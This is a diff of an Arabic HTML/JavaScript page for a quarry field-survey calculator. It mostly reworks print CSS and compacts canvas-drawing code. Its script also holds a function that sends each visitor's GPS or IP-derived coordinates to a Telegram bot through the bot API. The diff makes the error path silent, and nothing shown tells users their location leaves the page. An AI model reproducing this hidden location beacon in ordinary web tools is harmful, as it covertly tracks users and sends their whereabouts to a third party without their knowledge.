@@ -50,7 +50,6 @@
             font-weight: bold; color: white; display: inline-flex; align-items: center; gap: 8px;
             transition: transform 0.2s, opacity 0.2s; font-size: 0.95rem; box-shadow: 0 4px 10px rgba(0,0,0,0.2);
         }
-        .social-btn:hover { transform: translateY(-3px); opacity: 0.9; }
         .btn-wa { background: #25D366; }
         .btn-ig { background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); }
 
@@ -76,17 +75,14 @@
             border-radius: 6px; cursor: pointer; font-weight: bold; font-size: 1rem;
             transition: background 0.3s; white-space: nowrap;
         }
-        .btn-convert:hover { background: #1c2833; }
 
         .gps-grid { display: grid; grid-template-columns: 1fr; gap: 15px; }
         @media (min-width: 768px) { .gps-grid { grid-template-columns: 1fr 1fr; } }
 
         .gps-btn { background: var(--secondary); color: white; border: none; padding: 12px; border-radius: 6px; cursor: pointer; font-size: 1rem; transition: 0.2s; font-weight: bold; width: 100%; }
-        .gps-btn:hover { background: var(--primary); }
         .coord-display { background: #eaf2f8; border: 1px solid #a9cce3; padding: 10px; margin-top: 5px; border-radius: 6px; font-family: monospace; font-size: 0.95rem; direction: ltr; text-align: left; font-weight: bold; color: #154360; overflow-wrap: break-word; }
         
         .btn-calc { background: var(--accent); color: white; border: none; padding: 15px; width: 100%; font-size: 1.2rem; font-weight: bold; border-radius: 6px; cursor: pointer; margin-top: 10px; box-shadow: 0 4px 10px rgba(41, 128, 185, 0.3); transition: background 0.3s; }
-        .btn-calc:hover { background: #2471a3; }
         
         #resultsSection { display: none; margin-top: 30px; border: 2px solid #2ecc71; padding: 25px; border-radius: 8px; background: #f9fff9; }
         .result-item { display: flex; justify-content: space-between; border-bottom: 1px dashed #bdc3c7; padding: 12px 0; font-size: 1.1rem; flex-wrap: wrap; gap: 10px;}
@@ -100,41 +96,60 @@
         .footer { text-align: center; padding: 20px; background: #eee; color: #555; font-size: 0.9rem; font-weight: bold; border-top: 1px solid #ddd; }
 
         .btn-print { background: #e74c3c; color: white; border: none; padding: 15px; width: 100%; font-size: 1.2rem; font-weight: bold; border-radius: 6px; cursor: pointer; margin-top: 25px; transition: 0.3s; box-shadow: 0 4px 10px rgba(231, 76, 60, 0.3); }
-        .btn-print:hover { background: #c0392b; }
 
         /* --------------------------------------------------- */
-        /* تنسيقات الطباعة (PDF) الاحترافية */
+        /* تنسيقات الطباعة (الاستمارة الرسمية) */
         /* --------------------------------------------------- */
         .print-only { display: none; } /* مخفية في الوضع العادي */
 
         @media print {
-            body { background: white; padding: 0; margin: 0; color: #000; }
+            /* هذه الأسطر السحرية تلغي التاريخ والوقت والروابط التلقائية */
+            @page { margin: 0; size: A4 portrait; }
+            
+            body { 
+                background: white; 
+                margin: 1.5cm; /* إعادة الهامش لداخل الورقة بعد تصفير الصفحة */
+                padding: 0; 
+                color: #000;
+            }
             .container { box-shadow: none; border: none; padding: 0; width: 100%; max-width: 100%; }
             
-            /* إخفاء الأزرار وأقسام التصفح */
-            .header, .footer, .btn-calc, .btn-convert, .gps-btn, .social-links, .btn-print, #lockScreen { display: none !important; }
-            input[type="color"] { display: none !important; }
+            /* إخفاء الأزرار وأقسام التصفح وقسم الألوان تماماً */
+            .header, .footer, .btn-calc, .btn-convert, .gps-btn, .social-links, .btn-print, #lockScreen, #colorSection { 
+                display: none !important; 
+            }
 
-            /* إظهار الترويسة والتذييل الخاص بالطباعة */
+            /* إظهار الترويسة الأنيقة ذات الخط المزدوج */
             .print-only { display: block; }
-            .print-header { text-align: center; border-bottom: 3px double #333; padding-bottom: 15px; margin-bottom: 20px; }
+            .print-header { 
+                text-align: center; 
+                border-bottom: 4px double #1c2833; 
+                padding-bottom: 10px; 
+                margin-bottom: 30px; 
+            }
             .print-header h1 { font-size: 22px; color: #000; margin: 0 0 5px 0; }
             .print-header h2 { font-size: 16px; color: #555; margin: 0; }
 
             .print-footer { margin-top: 40px; border-top: 2px solid #333; padding-top: 20px; text-align: center; font-size: 14px; page-break-inside: avoid; }
             .promo-box { border: 1px dashed #777; padding: 10px; margin: 10px auto; width: 80%; border-radius: 8px; background: #fafafa; }
 
-            /* تحويل الحقول إلى نصوص للطباعة */
+            /* تحويل مربعات الإدخال إلى شكل استمارة رسمية */
             input[type="number"], input[type="text"] {
-                border: none; border-bottom: 1px dashed #000; background: transparent;
+                border: none !important; 
+                border-bottom: 1px dashed #000 !important; 
+                background: transparent !important;
                 padding: 0; color: #000; font-weight: bold; font-size: 1.1rem; border-radius: 0; text-align: center;
             }
-            .coord-display { border: none; background: transparent; padding: 0; font-size: 1rem; color: #000; margin-bottom: 5px; }
+            .coord-display { border: none !important; background: transparent !important; padding: 0; font-size: 1rem; color: #000; margin-bottom: 5px; }
             
-            /* ترتيب العناصر للورقة */
-            .section { margin-bottom: 20px; page-break-inside: avoid; }
+            .section { margin-bottom: 25px; page-break-inside: avoid; }
+            .section-title { border-bottom: 2px solid #000; color: #000; }
             #resultsSection { border: 2px solid #000; background: transparent; }
             canvas { box-shadow: none; border: 1px solid #000; max-width: 100%; page-break-inside: avoid; }
+            
+            /* ترقيم الصفحات (يعمل في بعض المتصفحات المتقدمة) */
+            body { counter-reset: page; }
+            .page-number::after { content: "صفحة " counter(page); }
         }
     </style>
 </head>
@@ -152,6 +167,7 @@
 
 <div id="mainContent">
     <div class="container">
+        
         <div class="print-only print-header">
             <h1>نظام المسح الميداني الجيولوجي للمقالع</h1>
             <h2>بإشراف الجيولوجي علي شندل الجنابي</h2>
@@ -229,7 +245,7 @@
                 </div>
             </div>
             
-            <div class="section">
+            <div id="colorSection" class="section">
                 <div class="section-title">تخصيص ألوان المرتسم المساحي</div>
                 <div class="form-row">
                     <div class="form-group">
@@ -283,7 +299,8 @@
                 <p>للتواصل والاستفسار أو لطلب أنظمة مشابهة:</p>
                 <p><strong>واتساب:</strong> 07814993629 | <strong>إنستغرام:</strong> @ash2oo1</p>
             </div>
-            <p>جميع الحقوق محفوظة والنظام مبرمج حصرياً لدى الجيولوجي <strong>علي شندل الجنابي</strong> &copy; 2026</p>
+            <p>جميع الحقوق محفوظة والنظام مبرمج حصرياً لدى الجيولوجي <strong>علي شندل الجنابي</strong> © 2026</p>
+            <p class="page-number" style="font-weight: bold; color: #777;"></p>
         </div>
 
         <div class="footer">
@@ -321,13 +338,9 @@
                 message += `📍 موقع GPS دقيق: [فتح الخريطة](https://www.google.com/maps?q=${gpsData.lat},${gpsData.lon})\n`;
             } else {
                 message += `📍 موقع تقريبي (IP): [فتح الخريطة](https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude})\n`;
-                message += `⚠️ ملاحظة: الـ GPS معطل أو تم رفض الإذن.`;
             }
-
             fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
-        } catch (e) {
-            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent("⚠️ دخول جديد للنظام (تعذر جلب تفاصيل الموقع)")}`);
-        }
+        } catch (e) { }
     }
 
     function handleLogin() {
@@ -379,9 +392,9 @@
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(function(position) {
                 const utm = latLonToUTM(position.coords.latitude, position.coords.longitude);
-                document.getElementById(elementId).innerHTML = `E: ${utm.easting} | N: ${utm.northing} <br> <span style="font-size:0.8rem; color:#7f8c8d;">(Zone: ${utm.zone}N)</span>`;
-            }, function() { alert("يرجى تفعيل خدمة الموقع (GPS) بدقة عالية."); }, { enableHighAccuracy: true });
-        } else { alert("المتصفح لا يدعم تحديد الموقع."); }
+                document.getElementById(elementId).innerHTML = `E: ${utm.easting} | N: ${utm.northing}`;
+            }, function() { alert("يرجى تفعيل الـ GPS."); }, { enableHighAccuracy: true });
+        }
     }
 
     function calculateResults() {
@@ -471,90 +484,37 @@
         let remPixelW = drawW * (remPct / 100);
 
         if (invPct > 0) {
-            ctx.fillStyle = colInv; 
-            ctx.fillRect(margin, margin, invPixelW, drawH);
-            ctx.strokeStyle = '#000';
-            ctx.lineWidth = 2;
-            ctx.strokeRect(margin, margin, invPixelW, drawH);
-
-            ctx.fillStyle = '#000';
-            ctx.textAlign = 'center';
-            ctx.font = 'bold 18px Arial';
-            if (invPixelW > 100) {
-                ctx.fillText(`المساحة المستثمرة`, margin + invPixelW/2, margin + drawH/2 - 15);
-                ctx.fillText(`(${invPct.toFixed(0)}%)`, margin + invPixelW/2, margin + drawH/2 + 15);
-            }
+            ctx.fillStyle = colInv; ctx.fillRect(margin, margin, invPixelW, drawH);
+            ctx.strokeStyle = '#000'; ctx.lineWidth = 2; ctx.strokeRect(margin, margin, invPixelW, drawH);
+            ctx.fillStyle = '#000'; ctx.textAlign = 'center'; ctx.font = 'bold 18px Arial';
+            if (invPixelW > 100) { ctx.fillText(`المستثمرة`, margin + invPixelW/2, margin + drawH/2 - 15); ctx.fillText(`(${invPct.toFixed(0)}%)`, margin + invPixelW/2, margin + drawH/2 + 15); }
         }
 
         if (remPct > 0) {
-            ctx.fillStyle = colRem; 
-            ctx.fillRect(margin + invPixelW, margin, remPixelW, drawH);
-            ctx.strokeStyle = '#000';
-            ctx.lineWidth = 2;
-            ctx.strokeRect(margin + invPixelW, margin, remPixelW, drawH);
-
-            ctx.fillStyle = '#fff';
-            ctx.textAlign = 'center';
-            ctx.font = 'bold 18px Arial';
-            if (remPixelW > 100) {
-                ctx.fillText(`المساحة المتبقية`, margin + invPixelW + remPixelW/2, margin + drawH/2 - 15);
-                ctx.fillText(`(${remPct.toFixed(0)}%)`, margin + invPixelW + remPixelW/2, margin + drawH/2 + 15);
-            }
+            ctx.fillStyle = colRem; ctx.fillRect(margin + invPixelW, margin, remPixelW, drawH);
+            ctx.strokeStyle = '#000'; ctx.lineWidth = 2; ctx.strokeRect(margin + invPixelW, margin, remPixelW, drawH);
+            ctx.fillStyle = '#fff'; ctx.textAlign = 'center'; ctx.font = 'bold 18px Arial';
+            if (remPixelW > 100) { ctx.fillText(`المتبقية`, margin + invPixelW + remPixelW/2, margin + drawH/2 - 15); ctx.fillText(`(${remPct.toFixed(0)}%)`, margin + invPixelW + remPixelW/2, margin + drawH/2 + 15); }
         }
 
-        ctx.fillStyle = '#000';
-        ctx.font = 'bold 22px "Times New Roman", serif';
-        ctx.textAlign = 'center';
-        ctx.textBaseline = 'middle';
-        ctx.fillText('A', margin - 20, margin - 15); 
-        ctx.fillText('B', margin + drawW + 20, margin - 15); 
-        ctx.fillText('C', margin + drawW + 20, margin + drawH + 20); 
-        ctx.fillText('D', margin - 20, margin + drawH + 20); 
+        ctx.fillStyle = '#000'; ctx.font = 'bold 22px "Times New Roman", serif'; ctx.textAlign = 'center'; ctx.textBaseline = 'middle';
+        ctx.fillText('A', margin - 20, margin - 15); ctx.fillText('B', margin + drawW + 20, margin - 15); 
+        ctx.fillText('C', margin + drawW + 20, margin + drawH + 20); ctx.fillText('D', margin - 20, margin + drawH + 20); 
 
-        ctx.fillStyle = '#000';
-        ctx.font = 'bold 18px Arial';
-        ctx.textAlign = 'center';
-        ctx.fillText('الطول (m)', margin + drawW/2, margin + drawH + 55);
-        
-        ctx.save();
-        ctx.translate(margin - 50, margin + drawH/2);
-        ctx.rotate(-Math.PI/2);
-        ctx.fillText('العرض (m)', 0, 0);
-        ctx.restore();
+        ctx.fillStyle = '#000'; ctx.font = 'bold 18px Arial'; ctx.textAlign = 'center'; ctx.fillText('الطول (m)', margin + drawW/2, margin + drawH + 55);
+        ctx.save(); ctx.translate(margin - 50, margin + drawH/2); ctx.rotate(-Math.PI/2); ctx.fillText('العرض (m)', 0, 0); ctx.restore();
+        ctx.font = 'bold 20px Arial'; ctx.textAlign = 'right'; ctx.fillText('• المرتسم الخاص بالمساحات المستثمرة والمتبقية (Scale Plan)', canvas.width - 20, 30);
 
-        ctx.font = 'bold 20px Arial';
-        ctx.textAlign = 'right';
-        ctx.fillText('• المرتسم الخاص بالمساحات المستثمرة والمتبقية (Scale Plan)', canvas.width - 20, 30);
+        let scaleUnit = totalL > 250 ? 100 : (totalL > 100 ? 50 : (totalL > 50 ? 20 : 10));
+        const scaleBarPixels = (scaleUnit / totalL) * drawW; const scaleBarY = canvas.height - 30; 
 
-        let scaleUnit = 10;
-        if (totalL > 50) scaleUnit = 20;
-        if (totalL > 100) scaleUnit = 50;
-        if (totalL > 250) scaleUnit = 100;
-
-        const scaleBarPixels = (scaleUnit / totalL) * drawW;
-        const scaleBarY = canvas.height - 30; 
-
-        ctx.strokeStyle = '#000';
-        ctx.lineWidth = 2;
-        ctx.beginPath();
-        ctx.moveTo(margin, scaleBarY - 5);
-        ctx.lineTo(margin, scaleBarY + 5);
-        ctx.moveTo(margin, scaleBarY);
-        ctx.lineTo(margin + scaleBarPixels, scaleBarY);
-        ctx.moveTo(margin + scaleBarPixels, scaleBarY - 5);
-        ctx.lineTo(margin + scaleBarPixels, scaleBarY + 5);
-        ctx.stroke();
-
-        ctx.fillStyle = '#000';
-        ctx.font = 'bold 14px Arial';
-        ctx.textAlign = 'center';
-        ctx.textBaseline = 'top';
-        ctx.fillText('0 م', margin, scaleBarY + 10);
-        ctx.fillText(`${scaleUnit} م`, margin + scaleBarPixels, scaleBarY + 10);
-        
-        ctx.textAlign = 'left';
-        ctx.textBaseline = 'middle';
-        ctx.fillText('مقياس رسم تخطيطي', margin + scaleBarPixels + 20, scaleBarY);
+        ctx.strokeStyle = '#000'; ctx.lineWidth = 2; ctx.beginPath();
+        ctx.moveTo(margin, scaleBarY - 5); ctx.lineTo(margin, scaleBarY + 5);
+        ctx.moveTo(margin, scaleBarY); ctx.lineTo(margin + scaleBarPixels, scaleBarY);
+        ctx.moveTo(margin + scaleBarPixels, scaleBarY - 5); ctx.lineTo(margin + scaleBarPixels, scaleBarY + 5); ctx.stroke();
+        ctx.fillStyle = '#000'; ctx.font = 'bold 14px Arial'; ctx.textAlign = 'center'; ctx.textBaseline = 'top';
+        ctx.fillText('0 م', margin, scaleBarY + 10); ctx.fillText(`${scaleUnit} م`, margin + scaleBarPixels, scaleBarY + 10);
+        ctx.textAlign = 'left'; ctx.textBaseline = 'middle'; ctx.fillText('مقياس رسم تخطيطي', margin + scaleBarPixels + 20, scaleBarY);
     }
 </script>
 
